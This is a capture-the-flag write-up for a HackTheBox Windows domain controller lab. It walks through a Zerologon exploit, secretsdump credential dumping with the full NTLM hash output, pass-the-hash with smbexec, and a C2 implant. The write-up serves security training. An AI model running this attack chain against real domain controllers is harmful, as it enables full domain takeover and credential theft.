### Challenge description
FullPwn challenges don't have a description. We just get an IP address and are supposed to get user and root flag.

I got both user AND root flags for this challenge via unintended means.

A port scan shows we are dealing with a Windows AD machine:

```nmap
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-07-15 19:03:58Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: contempt.htb, Site: Default-First-Site-Name)
443/tcp   open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-07-15T19:05:27+00:00; 0s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=contempt.htb/organizationName=Contempt
| Subject Alternative Name: DNS:nextcloud.contempt.htb
| Not valid before: 2023-05-18T17:43:41
|_Not valid after:  2073-05-18T17:53:41
|_http-title: Not Found
445/tcp   open  microsoft-ds      Windows Server 2016 Standard 14393 microsoft-ds (workgroup: CONTEMPT)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
2179/tcp  open  vmrdp?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: contempt.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49669/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc             Microsoft Windows RPC
49719/tcp open  msrpc             Microsoft Windows RPC
57830/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: dc01
|   NetBIOS computer name: DC01\x00
|   Domain name: contempt.htb
|   Forest name: contempt.htb
|   FQDN: dc01.contempt.htb
|_  System time: 2023-07-15T12:04:49-07:00
```
It seems we have a Nextcloud instance on port 443:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/5e32bc94-1c82-4941-9e9b-ef52d42c3442)

As I usually do, when first seeing a Domain Controller, I check for known vulnerabilities and a good one to check for is `zerologon`. We can do that easily using crackmapexec:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/6db62cb4-8165-4cb0-8f8a-577a930ef9f1)

It seems it is vulnerable. I cloned this repo: https://github.com/risksense/zerologon and tried to set an empty password for the DC.

```bash
./set_empty_pw.py DC01 contempt.htb
```
It took a bit of time, I was starting to think it was a false positive but we got there eventually. The exploit worked:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/269b3455-2d22-4dcd-ac00-2a622e429e84)

I used secretsdump.py to get all the hashes from the DC:

```bash
secretsdump.py -just-dc -no-pass DC01\$@contempt.htb
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6c8f447c25487adc9148b0a90036c6a8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d8d6f9644b7ef09c5c9d12d01a18bc7a:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
contempt.htb\svc-ldap:1104:aad3b435b51404eeaad3b435b51404ee:b6fa6cd30819a545a7f12a76b54b6e84:::
contempt.htb\seraphina.blake:1601:aad3b435b51404eeaad3b435b51404ee:2f320b121f6ae368a35ba9819e0d2516:::
contempt.htb\phoenix.reed:1602:aad3b435b51404eeaad3b435b51404ee:8213160e905b6817df4ee0c2c8b48e12:::
contempt.htb\cipher.stone:1603:aad3b435b51404eeaad3b435b51404ee:a5e12330358741a01370caf5dc316f86:::
contempt.htb\zero.summers:1604:aad3b435b51404eeaad3b435b51404ee:b8e7d7f4e6361c680c24f0a7bdd6e92a:::
contempt.htb\viper.hollow:1605:aad3b435b51404eeaad3b435b51404ee:744574681328753ff5c843b8d3c100a2:::
contempt.htb\matrix.cross:1606:aad3b435b51404eeaad3b435b51404ee:2c03a59578699559cc2940d712fd964d:::
contempt.htb\orion.swift:1607:aad3b435b51404eeaad3b435b51404ee:928e41a48e0597ec9747c7b6b9fd86db:::
contempt.htb\aria.frost:1608:aad3b435b51404eeaad3b435b51404ee:9d0827ca3f062bddb35f88bc5bf15158:::
contempt.htb\echo.rivers:1609:aad3b435b51404eeaad3b435b51404ee:a7be11b5be8bb84196edbd0e8c0bc9ea:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc-adfs$:1103:aad3b435b51404eeaad3b435b51404ee:b62f7224fe2c58991ed0b7f29fcb2734:::
[*] Kerberos keys grabbed
<snipped>
```

I was able to use the administrator's NTLM hash to confirm that the DC has been pwned.

```bash
crackmapexec smb contempt.htb -u administrator -H 6c8f447c25487adc9148b0a90036c6a8 --shares
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/0ec4b7e0-611d-4771-973f-ccb7501cf8d4)

Interestingly enough, we don't see C$ or ADMIN$ shares writable or at all. But we do see NETLOGON. We can use `smbexec.py` to get a foothold and we must use `-share` flag to specify the share where we want our payload to be executed from:

```bash
smbexec.py contemp.htb/administrator@contempt.htb -hashes :6c8f447c25487adc9148b0a90036c6a8 -share NETLOGON
```

We get a semi-interactive shell and can read the administrator flag.

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/8f39bcda-1c7e-4a64-a814-dc4b02d47e1a)

HTB{good_d@y_For_PhiSH1N6_On_mARS}

### Privilege de-escalation?!

Curiously, we can't find the user flag anywhere via the shell we have. I wanted better access so I uploaded a Havoc C2 implant and got a reverse shell there. Then I executed the following command to recursively search for specific pattern in the entire filesystem:

```powershell
shell powershell -command "ls -fo -r \ -erroraction silentlycontinue | sls -pattern 'HTB{' -erroraction silentlycontinue"
```

After a while, we get the user flag out of a .vhdx file:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/89843c7b-8dfd-4f6f-bfc0-7c31264f29d6)

HTB{aDFs_K1LLcHAIn_put5_y0U_oN_clOuD9}

